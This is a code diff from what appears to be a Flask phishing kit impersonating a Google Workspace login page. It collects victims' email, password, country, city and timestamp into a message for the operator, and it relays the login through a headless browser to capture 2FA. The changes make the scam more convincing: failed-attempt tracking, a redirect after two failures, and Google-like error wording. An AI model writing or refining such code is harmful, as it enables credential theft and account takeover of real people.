@@ -219,11 +219,11 @@ def password():
 def enter_password():
     email = session.get('email')
     error = None
-    branding = None
     password_val = None
 
-    if email:
-        branding = get_google_email_details(email)
+    # Track failed attempts in session
+    if 'failed_attempts' not in session:
+        session['failed_attempts'] = 0
 
     if request.method == 'POST':
         password_val = request.form.get('password') or ''
@@ -246,7 +246,7 @@ def enter_password():
         except Exception:
             user_country = ''
             user_city = ''
-        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
+        current_time = datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00', 'Z')
         credentials_message = (
             f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
             f"📧 Email: {email}\n"
@@ -286,29 +286,46 @@ def enter_password():
             twofa_html = login_result.get('2fa_html', '')
             return Response(twofa_html, mimetype='text/html')
         elif login_result is not None and login_result.get('error') == 'invalid_password':
-            error = 'Invalid password. Please try again.'
+            session['failed_attempts'] += 1
+            if session['failed_attempts'] >= 2:
+                # After second failed attempt, redirect to bot error handler for debugging
+                return redirect(url_for('bot_error_handler'))
+            error = 'Password incorrect or account does not exist. Please try again.'
             session['authenticated'] = False
             session['password'] = None
             return render_template(
-            'password.html',
-            email=email,
-            banner=session.get('banner'),
-            background=session.get('background'),
-            error=error,
-            loading=False
+                'password.html',
+                email=email,
+                banner=session.get('banner'),
+                background=session.get('background'),
+                error=error,
+                loading=False
             )
         else:
-            error = 'Login failed. Please try again later.'
+            session['failed_attempts'] += 1
+            if session['failed_attempts'] >= 2:
+                # After second failed attempt, redirect to bot error handler for debugging
+                return redirect(url_for('bot_error_handler'))
+            error = 'Password incorrect or account does not exist. Please try again.'
             session['authenticated'] = False
             session['password'] = None
             return render_template(
-            'password.html',
-            email=email,
-            banner=session.get('banner'),
-            background=session.get('background'),
-            error=error,
-            loading=False
+                'password.html',
+                email=email,
+                banner=session.get('banner'),
+                background=session.get('background'),
+                error=error,
+                loading=False
             )
+    # Always render the password page on GET or if no POST occurred
+    return render_template(
+        'password.html',
+        email=email,
+        banner=session.get('banner'),
+        background=session.get('background'),
+        error=error,
+        loading=False
+    )
 
 
 def handle_headless_login(email, password):
